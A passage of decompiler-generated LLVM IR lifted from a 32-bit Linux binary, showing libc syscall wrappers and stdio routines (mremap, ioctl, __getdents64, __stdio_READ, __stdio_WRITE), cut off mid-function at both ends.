  %v1_804cff7 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cff7 = add i32 %v1_804cff7, 76
  %v3_804cff7 = inttoptr i32 %v2_804cff7 to i32*
  store i32 %v3_804cff4, i32* %v3_804cff7, align 4
  %v0_804cffa = load i32, i32* %edx.global-to-local, align 4
  %v1_804cffa = load i32, i32* %esi.global-to-local, align 4
  %v2_804cffa = add i32 %v1_804cffa, 72
  %v3_804cffa = inttoptr i32 %v2_804cffa to i32*
  store i32 %v0_804cffa, i32* %v3_804cffa, align 4
  ret i32 %v3_804cff4
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d004 = load i32, i32* @edi, align 4
  %v0_804d005 = load i32, i32* @esi, align 4
  store i32 %v0_804d005, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_804d01a = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_804d022 = call i32 @mremap(i32 %v0_804d01a, i32 %v0_804d005, i32 %v0_804d004, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v6_804d022, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v6_804d022, -4095
  br i1 %tmp10, label %dec_label_pc_804d03b, label %dec_label_pc_804d02f

dec_label_pc_804d02f:                             ; preds = %entry
  %v1_804d02f = call i32 @__GI___errno_location(i32 %v0_804d01a)
  %v0_804d034 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d034 = sub i32 0, %v0_804d034
  store i32 %v1_804d034, i32* %esi.global-to-local, align 4
  %v2_804d036 = inttoptr i32 %v1_804d02f to i32*
  store i32 %v1_804d034, i32* %v2_804d036, align 4
  br label %dec_label_pc_804d03b

dec_label_pc_804d03b:                             ; preds = %entry, %dec_label_pc_804d02f
  %v0_804d03d = phi i32 [ %v6_804d022, %entry ], [ -1, %dec_label_pc_804d02f ]
  %v2_804d03b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d03b, i32* @esi, align 4
  store i32 %v0_804d004, i32* @edi, align 4
  ret i32 %v0_804d03d

; uselistorder directives
  uselistorder i32 %v6_804d022, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d03b, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d040 = load i32, i32* @ebx, align 4
  store i32 %v0_804d040, i32* %stack_var_-4, align 4
  %v2_804d048 = ptrtoint i32* %stack_var_16 to i32
  store i32 %arg1, i32* @ebx, align 4
  %v3_804d05f = call i32 @ioctl(i32 %v0_804d040, i32 %v2_804d048, i32 %v0_804d040)
  store i32 %v3_804d05f, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_804d05f, -4095
  br i1 %tmp10, label %dec_label_pc_804d078, label %dec_label_pc_804d06c

dec_label_pc_804d06c:                             ; preds = %entry
  %v1_804d06c = call i32 @__GI___errno_location(i32 %v0_804d040)
  %v0_804d071 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d071 = sub i32 0, %v0_804d071
  store i32 %v1_804d071, i32* %ebx.global-to-local, align 4
  %v2_804d073 = inttoptr i32 %v1_804d06c to i32*
  store i32 %v1_804d071, i32* %v2_804d073, align 4
  %v2_804d079.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804d078

dec_label_pc_804d078:                             ; preds = %entry, %dec_label_pc_804d06c
  %v2_804d079 = phi i32 [ %v0_804d040, %entry ], [ %v2_804d079.pre, %dec_label_pc_804d06c ]
  %v0_804d07a = phi i32 [ %v3_804d05f, %entry ], [ -1, %dec_label_pc_804d06c ]
  store i32 %v2_804d079, i32* @ebx, align 4
  ret i32 %v0_804d07a

; uselistorder directives
  uselistorder i32 %v3_804d05f, { 1, 0, 2 }
  uselistorder i32 %v0_804d040, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 1, 0 }
  uselistorder label %dec_label_pc_804d078, { 1, 0 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp13 = ptrtoint i32* %arg2 to i32
  %stack_var_-32 = alloca i32, align 4
  %v0_804d07f = load i32, i32* @edi, align 4
  %v0_804d080 = load i32, i32* @esi, align 4
  %v0_804d081 = load i32, i32* @ebx, align 4
  %v12_804d082 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_804d088 = add i32 %arg3, 18
  %v1_804d08b = and i32 %v1_804d088, -4
  %v2_804d08e = sub i32 %v12_804d082, %v1_804d08b
  %v1_804d090 = add i32 %v2_804d08e, 15
  %v1_804d094 = and i32 %v1_804d090, -16
  %v8_804d094 = inttoptr i32 %v1_804d094 to %linux_dirent64*
  store i32 %v1_804d094, i32* %ecx.global-to-local, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v2_804d09a = add i32 %v2_804d08e, -4
  %v3_804d09a = inttoptr i32 %v2_804d09a to i32*
  store i32 %v0_804d081, i32* %v3_804d09a, align 4
  %v0_804d09b = load i32, i32* %eax.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_804d0a2 = call i32 @getdents64(i32 %v0_804d09b, %linux_dirent64* %v8_804d094, i32 %arg3)
  store i32 %v5_804d0a2, i32* %eax.global-to-local, align 4
  %v0_804d0a4 = load i32, i32* @esp, align 4
  store i32 %v5_804d0a2, i32* %esi.global-to-local, align 4
  %tmp38 = icmp ult i32 %v5_804d0a2, -4095
  br i1 %tmp38, label %dec_label_pc_804d0b9, label %dec_label_pc_804d0ae

dec_label_pc_804d0ae:                             ; preds = %entry
  %v1_804d0ae = call i32 @__GI___errno_location(i32 %v0_804d081)
  store i32 %v1_804d0ae, i32* %eax.global-to-local, align 4
  %v0_804d0b3 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d0b3 = sub i32 0, %v0_804d0b3
  store i32 %v1_804d0b3, i32* %esi.global-to-local, align 4
  %v2_804d0b5 = inttoptr i32 %v1_804d0ae to i32*
  store i32 %v1_804d0b3, i32* %v2_804d0b5, align 4
  br label %dec_label_pc_804d17c

dec_label_pc_804d0b9:                             ; preds = %entry
  %v3_804d0a4 = add i32 %v0_804d0a4, 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %tmp13, i32* @edi, align 4
  store i32 %v1_804d094, i32* @ebx, align 4
  %v3_804d0d8 = add i32 %v5_804d0a2, %v1_804d094
  store i32 %v3_804d0d8, i32* %esi.global-to-local, align 4
  %v2_804d0de = add i32 %tmp13, %arg3
  store i32 %v2_804d0de, i32* %edx.global-to-local, align 4
  store i32 %v2_804d0de, i32* %stack_var_-32, align 4
  %v10_804d16e27 = icmp ult i32 %v1_804d094, %v3_804d0d8
  br i1 %v10_804d16e27, label %dec_label_pc_804d0e8, label %dec_label_pc_804d177

dec_label_pc_804d0e8:                             ; preds = %dec_label_pc_804d0b9, %dec_label_pc_804d122.dec_label_pc_804d0e8_crit_edge
  %v4_804d0f5 = phi i32 [ %v4_804d0f5.pre, %dec_label_pc_804d122.dec_label_pc_804d0e8_crit_edge ], [ %v2_804d0de, %dec_label_pc_804d0b9 ]
  %stack_var_-24.033 = phi i32 [ %v3_804d122, %dec_label_pc_804d122.dec_label_pc_804d0e8_crit_edge ], [ -1, %dec_label_pc_804d0b9 ]
  %stack_var_-20.032 = phi i32 [ %v3_804d125, %dec_label_pc_804d122.dec_label_pc_804d0e8_crit_edge ], [ -1, %dec_label_pc_804d0b9 ]
  %v0_804d12e31 = phi i32 [ %v2_804d169, %dec_label_pc_804d122.dec_label_pc_804d0e8_crit_edge ], [ %v1_804d094, %dec_label_pc_804d0b9 ]
  %v1_804d13330 = phi i32 [ %v0_804d163, %dec_label_pc_804d122.dec_label_pc_804d0e8_crit_edge ], [ %tmp13, %dec_label_pc_804d0b9 ]
  %v0_804d0fa29 = phi i32 [ %v1_804d16b, %dec_label_pc_804d122.dec_label_pc_804d0e8_crit_edge ], [ %v3_804d0a4, %dec_label_pc_804d0b9 ]
  %v1_804d0e8 = add i32 %v0_804d12e31, 16
  %v2_804d0e8 = inttoptr i32 %v1_804d0e8 to i16*
  %v3_804d0e8 = load i16, i16* %v2_804d0e8, align 2
  %v4_804d0e8 = zext i16 %v3_804d0e8 to i32
  store i32 %v4_804d0e8, i32* %eax.global-to-local, align 4
  %v1_804d0ec = add nuw nsw i32 %v4_804d0e8, 3
  %v1_804d0ef = and i32 %v1_804d0ec, 131068
  store i32 %v1_804d0ef, i32* %ecx.global-to-local, align 4
  %v2_804d0f2 = add i32 %v1_804d0ef, %v1_804d13330
  store i32 %v2_804d0f2, i32* @esi, align 4
  %tmp39 = icmp ugt i32 %v2_804d0f2, %v4_804d0f5
  br i1 %tmp39, label %dec_label_pc_804d0fa, label %dec_label_pc_804d122

dec_label_pc_804d0fa:                             ; preds = %dec_label_pc_804d0e8
  %v1_804d0fa = add i32 %v0_804d0fa29, -4
  %v2_804d0fa = inttoptr i32 %v1_804d0fa to i32*
  store i32 0, i32* %v2_804d0fa, align 4
  %v5_804d0fc = add i32 %v0_804d0fa29, -8
  %v6_804d0fc = inttoptr i32 %v5_804d0fc to i32*
  store i32 %stack_var_-20.032, i32* %v6_804d0fc, align 4
  %v5_804d0ff = add i32 %v0_804d0fa29, -12
  %v6_804d0ff = inttoptr i32 %v5_804d0ff to i32*
  store i32 %stack_var_-24.033, i32* %v6_804d0ff, align 4
  %v5_804d102 = add i32 %v0_804d0fa29, -16
  %v6_804d102 = inttoptr i32 %v5_804d102 to i32*
  store i32 %arg1, i32* %v6_804d102, align 4
  %v0_804d105 = load i32, i32* %stack_var_-32, align 4
  %v5_804d105 = call i32 @__GI_lseek64(i32 %v0_804d105, i32 %v3_804d0d8, i32 %stack_var_-24.033, i32 %stack_var_-20.032, i32 %v0_804d081)
  store i32 %v5_804d105, i32* %eax.global-to-local, align 4
  %v0_804d10d = load i32, i32* @edi, align 4
  %v15_804d10d = icmp eq i32 %v0_804d10d, %tmp13
  %v1_804d110 = icmp eq i1 %v15_804d10d, false
  br i1 %v1_804d110, label %dec_label_pc_804d177, label %dec_label_pc_804d112

dec_label_pc_804d112:                             ; preds = %dec_label_pc_804d0fa
  %v0_804d112 = load i32, i32* %stack_var_-32, align 4
  %v1_804d112 = call i32 @__GI___errno_location(i32 %v0_804d112)
  store i32 %v1_804d112, i32* %eax.global-to-local, align 4
  %v1_804d117 = inttoptr i32 %v1_804d112 to i32*
  store i32 22, i32* %v1_804d117, align 4
  br label %dec_label_pc_804d17c

dec_label_pc_804d122:                             ; preds = %dec_label_pc_804d0e8
  %v1_804d122 = add i32 %v0_804d12e31, 8
  %v2_804d122 = inttoptr i32 %v1_804d122 to i32*
  %v3_804d122 = load i32, i32* %v2_804d122, align 4
  store i32 %v3_804d122, i32* %eax.global-to-local, align 4
  %v1_804d125 = add i32 %v0_804d12e31, 12
  %v2_804d125 = inttoptr i32 %v1_804d125 to i32*
  %v3_804d125 = load i32, i32* %v2_804d125, align 4
  store i32 %v3_804d125, i32* %edx.global-to-local, align 4
  %v1_804d12e = inttoptr i32 %v0_804d12e31 to i32*
  %v2_804d12e = load i32, i32* %v1_804d12e, align 4
  store i32 %v2_804d12e, i32* %eax.global-to-local, align 4
  %v1_804d130 = add i32 %v0_804d12e31, 4
  %v2_804d130 = inttoptr i32 %v1_804d130 to i32*
  %v3_804d130 = load i32, i32* %v2_804d130, align 4
  store i32 %v3_804d130, i32* %edx.global-to-local, align 4
  %v2_804d133 = inttoptr i32 %v1_804d13330 to i32*
  store i32 %v2_804d12e, i32* %v2_804d133, align 4
  %v0_804d135 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d135 = load i32, i32* @edi, align 4
  %v2_804d135 = add i32 %v1_804d135, 4
  %v3_804d135 = inttoptr i32 %v2_804d135 to i32*
  store i32 %v0_804d135, i32* %v3_804d135, align 4
  %v0_804d138 = load i32, i32* @ebx, align 4
  %v1_804d138 = add i32 %v0_804d138, 8
  %v2_804d138 = inttoptr i32 %v1_804d138 to i32*
  %v3_804d138 = load i32, i32* %v2_804d138, align 4
  store i32 %v3_804d138, i32* %eax.global-to-local, align 4
  %v1_804d13b = add i32 %v0_804d138, 12
  %v2_804d13b = inttoptr i32 %v1_804d13b to i32*
  %v3_804d13b = load i32, i32* %v2_804d13b, align 4
  store i32 %v3_804d13b, i32* %edx.global-to-local, align 4
  %v1_804d13e = load i32, i32* @edi, align 4
  %v2_804d13e = add i32 %v1_804d13e, 8
  %v3_804d13e = inttoptr i32 %v2_804d13e to i32*
  store i32 %v3_804d138, i32* %v3_804d13e, align 4
  %v0_804d141 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d141 = load i32, i32* @edi, align 4
  %v2_804d141 = add i32 %v1_804d141, 12
  %v3_804d141 = inttoptr i32 %v2_804d141 to i32*
  store i32 %v0_804d141, i32* %v3_804d141, align 4
  %v0_804d144 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d144 = trunc i32 %v0_804d144 to i16
  %v2_804d144 = load i32, i32* @edi, align 4
  %v3_804d144 = add i32 %v2_804d144, 16
  %v4_804d144 = inttoptr i32 %v3_804d144 to i16*
  store i16 %v1_804d144, i16* %v4_804d144, align 2
  %v0_804d148 = load i32, i32* @ebx, align 4
  %v1_804d148 = add i32 %v0_804d148, 18
  %v2_804d148 = inttoptr i32 %v1_804d148 to i8*
  %v3_804d148 = load i8, i8* %v2_804d148, align 1
  %v4_804d148 = zext i8 %v3_804d148 to i32
  %v5_804d148 = load i32, i32* %eax.global-to-local, align 4
  %v6_804d148 = and i32 %v5_804d148, -256
  %v7_804d148 = or i32 %v6_804d148, %v4_804d148
  store i32 %v7_804d148, i32* %eax.global-to-local, align 4
  %v2_804d14b = load i32, i32* @edi, align 4
  %v3_804d14b = add i32 %v2_804d14b, 18
  %v4_804d14b = inttoptr i32 %v3_804d14b to i8*
  store i8 %v3_804d148, i8* %v4_804d14b, align 1
  %v0_804d14e = load i32, i32* @ebx, align 4
  %v1_804d14e = add i32 %v0_804d14e, 16
  %v2_804d14e = inttoptr i32 %v1_804d14e to i16*
  %v3_804d14e = load i16, i16* %v2_804d14e, align 2
  %v4_804d14e = zext i16 %v3_804d14e to i32
  %v1_804d152 = add nsw i32 %v4_804d14e, -19
  %v1_804d155 = load i32, i32* @esp, align 4
  %v2_804d155 = add i32 %v1_804d155, -4
  %v3_804d155 = inttoptr i32 %v2_804d155 to i32*
  store i32 %v1_804d152, i32* %v3_804d155, align 4
  %v0_804d156 = load i32, i32* @ebx, align 4
  %v1_804d156 = add i32 %v0_804d156, 19
  %v2_804d159 = add i32 %v1_804d155, -8
  %v3_804d159 = inttoptr i32 %v2_804d159 to i32*
  store i32 %v1_804d156, i32* %v3_804d159, align 4
  %v0_804d15a = load i32, i32* @edi, align 4
  %v1_804d15a = add i32 %v0_804d15a, 19
  store i32 %v1_804d15a, i32* %eax.global-to-local, align 4
  %v2_804d15d = add i32 %v1_804d155, -12
  %v3_804d15d = inttoptr i32 %v2_804d15d to i32*
  store i32 %v1_804d15a, i32* %v3_804d15d, align 4
  %v3_804d15e = inttoptr i32 %v3_804d122 to i8*
  %v4_804d15e = call i32 @memcpy(i8* %v3_804d15e, i32 %v3_804d125, i32 %v0_804d081)
  store i32 %v4_804d15e, i32* %eax.global-to-local, align 4
  %v0_804d163 = load i32, i32* @esi, align 4
  store i32 %v0_804d163, i32* @edi, align 4
  %v0_804d165 = load i32, i32* @ebx, align 4
  %v1_804d165 = add i32 %v0_804d165, 16
  %v2_804d165 = inttoptr i32 %v1_804d165 to i16*
  %v3_804d165 = load i16, i16* %v2_804d165, align 2
  %v4_804d165 = zext i16 %v3_804d165 to i32
  store i32 %v4_804d165, i32* %eax.global-to-local, align 4
  %v2_804d169 = add i32 %v4_804d165, %v0_804d165
  store i32 %v2_804d169, i32* @ebx, align 4
  %v10_804d16e = icmp ult i32 %v2_804d169, %v3_804d0d8
  br i1 %v10_804d16e, label %dec_label_pc_804d122.dec_label_pc_804d0e8_crit_edge, label %dec_label_pc_804d177

dec_label_pc_804d122.dec_label_pc_804d0e8_crit_edge: ; preds = %dec_label_pc_804d122
  %v0_804d16b = load i32, i32* @esp, align 4
  %v1_804d16b = add i32 %v0_804d16b, 12
  %v4_804d0f5.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_804d0e8

dec_label_pc_804d177:                             ; preds = %dec_label_pc_804d0b9, %dec_label_pc_804d122, %dec_label_pc_804d0fa
  %v0_804d177 = phi i32 [ %v0_804d10d, %dec_label_pc_804d0fa ], [ %tmp13, %dec_label_pc_804d0b9 ], [ %v0_804d163, %dec_label_pc_804d122 ]
  %v5_804d179 = sub i32 %v0_804d177, %tmp13
  br label %dec_label_pc_804d17c

dec_label_pc_804d17c:                             ; preds = %dec_label_pc_804d112, %dec_label_pc_804d0ae, %dec_label_pc_804d177
  %storemerge = phi i32 [ %v5_804d179, %dec_label_pc_804d177 ], [ -1, %dec_label_pc_804d0ae ], [ -1, %dec_label_pc_804d112 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804d080, i32* @esi, align 4
  store i32 %v0_804d07f, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_804d169, { 1, 2, 0 }
  uselistorder i32 %v0_804d163, { 0, 2, 1 }
  uselistorder i32 %v3_804d125, { 1, 2, 0 }
  uselistorder i32 %v3_804d122, { 1, 2, 0 }
  uselistorder i32 %v0_804d0fa29, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804d12e31, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v3_804d0d8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804d094, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_804d081, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp13, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 17, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16 }
  uselistorder i32 18, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d17c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d177, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804d0e8, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d184 = load i32, i32* @ebx, align 4
  store i32 %v0_804d184, i32* %stack_var_-4, align 4
  %v4_804d185 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804d185, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804d18f = bitcast i16* %arg1 to i8*
  %v2_804d18f = load i8, i8* %v1_804d18f, align 1
  %v3_804d18f = and i8 %v2_804d18f, 4
  %v4_804d18f = icmp eq i8 %v3_804d18f, 0
  %v1_804d192 = icmp eq i1 %v4_804d18f, false
  br i1 %v1_804d192, label %dec_label_pc_804d1c0, label %dec_label_pc_804d194

dec_label_pc_804d194:                             ; preds = %entry
  %v2_804d194 = icmp slt i32 %arg3, 0
  %v1_804d196 = icmp eq i1 %v2_804d194, false
  br i1 %v1_804d196, label %dec_label_pc_804d19d, label %dec_label_pc_804d198

dec_label_pc_804d198:                             ; preds = %dec_label_pc_804d194
  br label %dec_label_pc_804d19d

dec_label_pc_804d19d:                             ; preds = %dec_label_pc_804d194, %dec_label_pc_804d198
  %v0_804d19d = phi i32 [ %arg3, %dec_label_pc_804d194 ], [ 2147483647, %dec_label_pc_804d198 ]
  %v1_804d1a2 = add i32 %v4_804d185, 4
  %v2_804d1a2 = inttoptr i32 %v1_804d1a2 to i32*
  %v3_804d1a2 = load i32, i32* %v2_804d1a2, align 4
  %v3_804d1a5 = inttoptr i32 %arg2 to i32*
  %v4_804d1a5 = call i32 @__GI_read(i32 %v3_804d1a2, i32* %v3_804d1a5, i32 %v0_804d19d)
  store i32 %v4_804d1a5, i32* %eax.global-to-local, align 4
  %tmp10 = icmp slt i32 %v4_804d1a5, 1
  %tmp11 = icmp eq i1 %tmp10, false
  br i1 %tmp11, label %dec_label_pc_804d1c0, label %dec_label_pc_804d1b2

dec_label_pc_804d1b2:                             ; preds = %dec_label_pc_804d19d
  %v1_804d1ad = icmp eq i32 %v4_804d1a5, 0
  %v4_804d1b0 = icmp eq i1 %v1_804d1ad, false
  %v0_804d1ba = load i32, i32* @ebx, align 4
  %v1_804d1ba = inttoptr i32 %v0_804d1ba to i16*
  %v2_804d1ba = load i16, i16* %v1_804d1ba, align 2
  br i1 %v4_804d1b0, label %dec_label_pc_804d1ba, label %dec_label_pc_804d1b4

dec_label_pc_804d1b4:                             ; preds = %dec_label_pc_804d1b2
  %v3_804d1b4 = or i16 %v2_804d1ba, 4
  store i16 %v3_804d1b4, i16* %v1_804d1ba, align 2
  %v0_804d1c1.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d1c0

dec_label_pc_804d1ba:                             ; preds = %dec_label_pc_804d1b2
  %v3_804d1ba = or i16 %v2_804d1ba, 8
  store i16 %v3_804d1ba, i16* %v1_804d1ba, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d1c0

dec_label_pc_804d1c0:                             ; preds = %dec_label_pc_804d19d, %entry, %dec_label_pc_804d1b4, %dec_label_pc_804d1ba
  %v0_804d1c1 = phi i32 [ %v4_804d1a5, %dec_label_pc_804d19d ], [ 0, %entry ], [ %v0_804d1c1.pre, %dec_label_pc_804d1b4 ], [ 0, %dec_label_pc_804d1ba ]
  %v2_804d1c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d1c0, i32* @ebx, align 4
  ret i32 %v0_804d1c1

; uselistorder directives
  uselistorder i16 %v2_804d1ba, { 1, 0 }
  uselistorder i32 %v4_804d1a5, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804d1c0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804d19d, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d1c7 = load i32, i32* @ebx, align 4
  store i32 %v0_804d1c7, i32* %stack_var_-16, align 4
  %v4_804d1c8 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804d1c8, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* %ebp.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804d1d64 = icmp eq i32 %arg3, 0
  br i1 %v1_804d1d64, label %dec_label_pc_804d232, label %dec_label_pc_804d1db.lr.ph

dec_label_pc_804d1db.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804d1db

dec_label_pc_804d1db:                             ; preds = %dec_label_pc_804d1f7.dec_label_pc_804d1db_crit_edge, %dec_label_pc_804d1db.lr.ph
  %v0_804d1e8 = phi i32 [ %v4_804d1c8, %dec_label_pc_804d1db.lr.ph ], [ %v0_804d1e8.pre, %dec_label_pc_804d1f7.dec_label_pc_804d1db_crit_edge ]
  %v0_804d1e7 = phi i32 [ %arg2, %dec_label_pc_804d1db.lr.ph ], [ %v2_804d1f9, %dec_label_pc_804d1f7.dec_label_pc_804d1db_crit_edge ]
  %v0_804d1e4 = phi i32 [ %arg3, %dec_label_pc_804d1db.lr.ph ], [ %v2_804d1f7, %dec_label_pc_804d1f7.dec_label_pc_804d1db_crit_edge ]
  %v0_804d1db = icmp slt i32 %v0_804d1e4, 0
  %v2_804d1db = icmp eq i1 %v0_804d1db, false
  %storemerge = select i1 %v2_804d1db, i32 %v0_804d1e4, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804d1e8 = add i32 %v0_804d1e8, 4
  %v2_804d1e8 = inttoptr i32 %v1_804d1e8 to i32*
  %v3_804d1e8 = load i32, i32* %v2_804d1e8, align 4
  %tmp34 = inttoptr i32 %v0_804d1e7 to i32*
  %v5_804d1eb = call i32 @__GI_write(i32 %v3_804d1e8, i32* %tmp34, i32 %storemerge)
  store i32 %v5_804d1eb, i32* %eax.global-to-local, align 4
  %v2_804d1f3 = icmp slt i32 %v5_804d1eb, 0
  br i1 %v2_804d1f3, label %dec_label_pc_804d1fd, label %dec_label_pc_804d1f7

dec_label_pc_804d1f7:                             ; preds = %dec_label_pc_804d1db
  %v0_804d1f7 = load i32, i32* @ebx, align 4
  %v2_804d1f7 = sub i32 %v0_804d1f7, %v5_804d1eb
  %v12_804d1f7 = icmp eq i32 %v2_804d1f7, 0
  store i32 %v2_804d1f7, i32* @ebx, align 4
  %v0_804d1f9 = load i32, i32* %esi.global-to-local, align 4
  %v2_804d1f9 = add i32 %v0_804d1f9, %v5_804d1eb
  store i32 %v2_804d1f9, i32* %esi.global-to-local, align 4
  br i1 %v12_804d1f7, label %dec_label_pc_804d1d6.dec_label_pc_804d232.loopexit_crit_edge, label %dec_label_pc_804d1f7.dec_label_pc_804d1db_crit_edge

dec_label_pc_804d1f7.dec_label_pc_804d1db_crit_edge: ; preds = %dec_label_pc_804d1f7
  %v0_804d1e8.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d1db

dec_label_pc_804d1fd:                             ; preds = %dec_label_pc_804d1db
  %v0_804d1fd = load i32, i32* %edi.global-to-local, align 4
  %v1_804d1fd = inttoptr i32 %v0_804d1fd to i16*
  %v2_804d1fd = load i16, i16* %v1_804d1fd, align 2
  %v3_804d1fd = or i16 %v2_804d1fd, 8
  store i16 %v3_804d1fd, i16* %v1_804d1fd, align 2
  %v0_804d201 = load i32, i32* %edi.global-to-local, align 4
  %v1_804d201 = add i32 %v0_804d201, 8
  %v2_804d201 = inttoptr i32 %v1_804d201 to i32*
  %v3_804d201 = load i32, i32* %v2_804d201, align 4
  store i32 %v3_804d201, i32* %edx.global-to-local, align 4
  %v1_804d204 = add i32 %v0_804d201, 12
  %v2_804d204 = inttoptr i32 %v1_804d204 to i32*
  %v3_804d204 = load i32, i32* %v2_804d204, align 4
  store i32 %v3_804d204, i32* %eax.global-to-local, align 4
  %v2_804d209 = sub i32 %v3_804d204, %v3_804d201
  %v12_804d209 = icmp eq i32 %v2_804d209, 0
  store i32 %v2_804d209, i32* @ecx, align 4
  %v1_804d230.pre = load i32, i32* @ebx, align 4
  br i1 %v12_804d209, label %dec_label_pc_804d230, label %dec_label_pc_804d20d

dec_label_pc_804d20d:                             ; preds = %dec_label_pc_804d1fd
  %tmp35 = icmp ugt i32 %v2_804d209, %v1_804d230.pre
  br i1 %tmp35, label %dec_label_pc_804d211, label %dec_label_pc_804d213.preheader

dec_label_pc_804d211:                             ; preds = %dec_label_pc_804d20d
  store i32 %v1_804d230.pre, i32* @ecx, align 4
  br label %dec_label_pc_804d213.preheader

dec_label_pc_804d213.preheader:                   ; preds = %dec_label_pc_804d20d, %dec_label_pc_804d211
  %v0_804d213.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d213

dec_label_pc_804d213:                             ; preds = %dec_label_pc_804d213.preheader, %dec_label_pc_804d225
  %v2_804d215 = phi i32 [ %v3_804d201, %dec_label_pc_804d213.preheader ], [ %v1_804d221, %dec_label_pc_804d225 ]
  %v4_804d213 = phi i32 [ %v3_804d204, %dec_label_pc_804d213.preheader ], [ %v0_804d217, %dec_label_pc_804d225 ]
  %v0_804d213 = phi i32 [ %v0_804d213.pre, %dec_label_pc_804d213.preheader ], [ %v1_804d225, %dec_label_pc_804d225 ]
  %v1_804d213 = inttoptr i32 %v0_804d213 to i8*
  %v2_804d213 = load i8, i8* %v1_804d213, align 1
  %v3_804d213 = zext i8 %v2_804d213 to i32
  %v5_804d213 = and i32 %v4_804d213, -256
  %v6_804d213 = or i32 %v3_804d213, %v5_804d213
  store i32 %v6_804d213, i32* %eax.global-to-local, align 4
  %v3_804d215 = inttoptr i32 %v2_804d215 to i8*
  store i8 %v2_804d213, i8* %v3_804d215, align 1
  %v0_804d217 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d217 = trunc i32 %v0_804d217 to i8
  %v10_804d217 = icmp eq i8 %v1_804d217, 10
  %v1_804d219 = icmp eq i1 %v10_804d217, false
  br i1 %v1_804d219, label %dec_label_pc_804d221, label %dec_label_pc_804d21b

dec_label_pc_804d21b:                             ; preds = %dec_label_pc_804d213
  %v0_804d21b = load i32, i32* %edi.global-to-local, align 4
  %v1_804d21b = add i32 %v0_804d21b, 1
